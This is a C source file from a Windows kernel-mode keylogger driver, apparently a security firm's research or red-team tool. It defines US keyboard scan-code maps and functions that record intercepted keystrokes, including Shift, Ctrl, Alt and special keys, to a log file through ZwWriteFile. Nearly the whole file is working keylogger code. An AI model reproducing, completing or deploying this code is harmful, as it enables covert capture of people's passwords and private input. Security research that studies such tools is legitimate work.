/*
 * Copyright 2022 Praetorian Security, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <ntddk.h>

#include "keymap.h"
#include "keylog.h"
#include "ntundoc.h"

/*
 * US Keyboard Layout Mappings
 *
 * Source: http://www.quadibloc.com/comp/scan.htm
 */
#define INVALID   0X00
#define SPACE     0X01
#define ENTER     0X02
#define LSHIFT    0x03
#define RSHIFT    0x04 
#define CTRL      0x05 
#define ALT       0x06
#define BACKSPACE 0x07
#define ESC       0x08
#define TAB       0x09

char KeyMap[84] = {
	INVALID, //0
	INVALID, //1
	'1', //2
	'2', //3
	'3', //4
	'4', //5
	'5', //6
	'6', //7
	'7', //8
	'8', //9
	'9', //A
	'0', //B
	'-', //C
	'=', //D
	BACKSPACE, //E
	TAB,  //F
	'q', //10
	'w', //11
	'e', //12
	'r', //13
	't', //14
	'y', //15
	'u', //16
	'i', //17
	'o', //18
	'p', //19
	'[', //1A
	']', //1B
	ENTER, //1C
	CTRL, //1D
	'a', //1E
	's', //1F
	'd', //20
	'f', //21
	'g', //22
	'h', //23
	'j', //24
	'k', //25
	'l', //26
	';', //27
	'\'', //28
	'`', //29
	LSHIFT,	//2A
	'\\', //2B
	'z', //2C
	'x', //2D
	'c', //2E
	'v', //2F
	'b', //30
	'n', //31
	'm' , //32
	',', //33
	'.', //34
	'/', //35
	RSHIFT, //36
	INVALID, //37
	ALT, //38
	SPACE, //39
	INVALID, //3A
	INVALID, //3B
	INVALID, //3C
	INVALID, //3D
	INVALID, //3E
	INVALID, //3F
	INVALID, //40
	INVALID, //41
	INVALID, //42
	INVALID, //43
	INVALID, //44
	INVALID, //45
	INVALID, //46
	'7', //47
	'8', //48
	'9', //49
	INVALID, //4A
	'4', //4B
	'5', //4C
	'6', //4D
	INVALID, //4E
	'1', //4F
	'2', //50
	'3', //51
	'0', //52
};

///////////////////////////////////////////////////////////////////////
//The Extended Key Map is used for those scan codes that can map to
//more than one key.  This mapping is usually determined by the 
//states of other keys (ie. the shift must be pressed down with a letter
//to make it uppercase).
///////////////////////////////////////////////////////////////////////
char ExtendedKeyMap[84] = {
	INVALID, //0
	INVALID, //1
	'!', //2
	'@', //3
	'#', //4
	'$', //5
	'%', //6
	'^', //7
	'&', //8
	'*', //9
	'(', //A
	')', //B
	'_', //C
	'+', //D
	BACKSPACE, //E
	TAB,  //F
	'Q', //10
	'W', //11
	'E', //12
	'R', //13
	'T', //14
	'Y', //15
	'U', //16
	'I', //17
	'O', //18
	'P', //19
	'{', //1A
	'}', //1B
	ENTER, //1C
	CTRL, //1D
	'A', //1E
	'S', //1F
	'D', //20
	'F', //21
	'G', //22
	'H', //23
	'J', //24
	'K', //25
	'L', //26
	':', //27
	'"', //28
	'~', //29
	LSHIFT,	//2A
	'|', //2B
	'Z', //2C
	'X', //2D
	'C', //2E
	'V', //2F
	'B', //30
	'N', //31
	'M' , //32
	'<', //33
	'>', //34
	'?', //35
	RSHIFT, //36
	INVALID, //37
	INVALID, //38
	SPACE, //39
	INVALID, //3A
	INVALID, //3B
	INVALID, //3C
	INVALID, //3D
	INVALID, //3E
	INVALID, //3F
	INVALID, //40
	INVALID, //41
	INVALID, //42
	INVALID, //43
	INVALID, //44
	INVALID, //45
	INVALID, //46
	'7', //47
	'8', //48
	'9', //49
	INVALID, //4A
	'4', //4B
	'5', //4C
	'6', //4D
	INVALID, //4E
	'1', //4F
	'2', //50
	'3', //51
	'0', //52
};

/*
 * Write string to keylog file
 */
void WriteStringToLog(HANDLE hFile, char *str) 
{
	if(hFile != NULL) {                                            
		IO_STATUS_BLOCK io_status;                                               
		ZwWriteFile(hFile, NULL, NULL, NULL,
				    &io_status, str, (ULONG)strlen(str),
			        NULL, NULL);
	}
}
/*
 * Write char to keyboard file
 */
VOID 
WriteCharToLog(
		HANDLE hFile, 
		char c
		) 
{
	if(hFile != NULL) {                                            
		IO_STATUS_BLOCK io_status;                                               
		ZwWriteFile(hFile,NULL, NULL, NULL, &io_status, &c, 1, NULL, NULL);
	}
}

/*
 * Write intercepted keystroke to log file
 */
VOID 
WriteKeystrokeToLog(
		PKEYLOG_DEVICE_EXTENSION pDevExt, 
		KEY_DATA *kData
		) 
{
	char key;
	int flag;
	key = KeyMap[kData->KeyData];
	flag = 0;

	switch(key) {
		case LSHIFT:
		case RSHIFT:
			if(kData->KeyFlags == KEY_MAKE) {
				pDevExt->kState.kSHIFT = TRUE;
			} else {
				pDevExt->kState.kSHIFT = FALSE;
			}
			break;
		case CTRL:
			if(kData->KeyFlags == KEY_MAKE) {
				WriteStringToLog(pDevExt->KeystrokeFile, "[CTRL]");
				pDevExt->kState.kCTRL = TRUE;
			} else {
				pDevExt->kState.kCTRL = FALSE;
			}
			break;
		case ALT:
			if(kData->KeyFlags == KEY_MAKE) {
				WriteStringToLog(pDevExt->KeystrokeFile, "[ALT]");
				pDevExt->kState.kALT = TRUE;
			} else {
				pDevExt->kState.kALT = FALSE;
			}
			break;
		case SPACE:
			if((pDevExt->kState.kALT != TRUE) && (kData->KeyFlags == KEY_MAKE)) {  
				WriteStringToLog(pDevExt->KeystrokeFile, "[SPACE]");
			}
			break;
		case ENTER:
			if((pDevExt->kState.kALT != TRUE) && (kData->KeyFlags == KEY_MAKE)) {
				WriteStringToLog(pDevExt->KeystrokeFile, "[ENTER]");
			}
			break;
		case BACKSPACE:
			if(kData->KeyFlags == KEY_MAKE) {
				WriteStringToLog(pDevExt->KeystrokeFile, "[BACKSPACE]");
			}
			break;
		case ESC:
			if(kData->KeyFlags == KEY_MAKE) {
				WriteStringToLog(pDevExt->KeystrokeFile, "[ESC]");
			}
			break;
		case TAB:
			if(kData->KeyFlags == KEY_MAKE) {
				WriteStringToLog(pDevExt->KeystrokeFile, "[TAB]");
			}
			break;
		default:
			if((pDevExt->kState.kALT != TRUE) && (pDevExt->kState.kCTRL != TRUE) 
					&& (kData->KeyFlags == KEY_MAKE)) {
				if((key >= 0x21) && (key <= 0x7E)) {
					if(pDevExt->kState.kSHIFT || flag == KEYBOARD_CAPS_LOCK_ON) {
						WriteCharToLog(pDevExt->KeystrokeFile, ExtendedKeyMap[kData->KeyData]);
					} else {
						WriteCharToLog(pDevExt->KeystrokeFile, key);
					}
				}
			}
			break;
	}
}
